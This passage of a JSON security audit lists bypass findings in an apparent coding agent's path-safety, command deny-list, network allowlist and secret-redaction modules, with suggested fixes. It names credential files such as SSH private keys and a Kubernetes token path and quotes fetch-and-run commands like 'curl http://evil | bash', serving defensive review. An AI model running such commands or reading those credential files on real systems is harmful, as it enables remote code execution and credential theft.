      "title": "Absolute path bypass in path_safety",
      "detail": "_validate_safe_path does not reject absolute paths. '/etc/passwd', '/root/.ssh/id_rsa', '/var/run/secrets/kubernetes.io/serviceaccount/token' all pass. Fix: add check for path.is_absolute() or use an allowlist-only model restricting paths to a safe root.",
      "affected_module": "src/autodev/mcp_server/path_safety.py",
      "test_case": "B3"
    },
    {
      "severity": "P1",
      "id": "F-2",
      "title": "SSH private key names without extension bypass path_safety",
      "detail": "id_rsa, id_ed25519, id_ecdsa, id_dsa, authorized_keys, known_hosts are not in _EXACT_REJECT. They have no extension to match globs, and contain no substring from _BASENAME_SUBSTRINGS. Fix: add these names to _EXACT_REJECT.",
      "affected_module": "src/autodev/mcp_server/path_safety.py",
      "suggested_additions": ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "authorized_keys"],
      "test_case": "C4"
    },
    {
      "severity": "P2",
      "id": "F-3",
      "title": "Denylist curl/wget pattern does not match URL-parameterized pipe commands",
      "detail": "Rule 'curl | bash' does not match 'curl http://evil | bash' because the URL sits between curl and the pipe. Same for 'wget | bash' vs 'wget -O - url | sh'. Defense still holds via fail-closed allowlist. Fix: convert denylist pipe rules to regex patterns: re.search(r'curl\\s+.*\\|\\s*ba?sh', cmd).",
      "affected_module": "src/autodev/utils/command_safety.py",
      "test_cases": ["D1", "D2"]
    },
    {
      "severity": "P2",
      "id": "F-4",
      "title": "DNS rebinding not defended in NetworkAllowlist layer",
      "detail": "NetworkAllowlist evaluates hostnames as strings without DNS resolution. A hostname permitted on the allowlist could be DNS-rebinded to 127.0.0.1 after initial evaluation. The module docstring explicitly notes this is deferred to SandboxedExecutor. This gap should be documented in security architecture.",
      "affected_module": "src/autodev/executors/network_allowlist.py",
      "test_case": "G1"
    },
    {
      "severity": "P3",
      "id": "F-5",
      "title": "PyPI token regex stops at underscore — partial redaction",
      "detail": "Pattern pypi-[A-Za-z0-9\\-]{20,} does not include underscore. Real PyPI tokens contain '_' separating macaroon sections. Only the portion up to the first '_' is matched and redacted; subsequent sections remain in logs. The core credential value is still protected but the trailing section leaks. Fix: extend char class to [A-Za-z0-9\\-_].",
      "affected_module": "src/autodev/utils/secret_redaction.py",
      "test_case": "F1"
    }
  ],
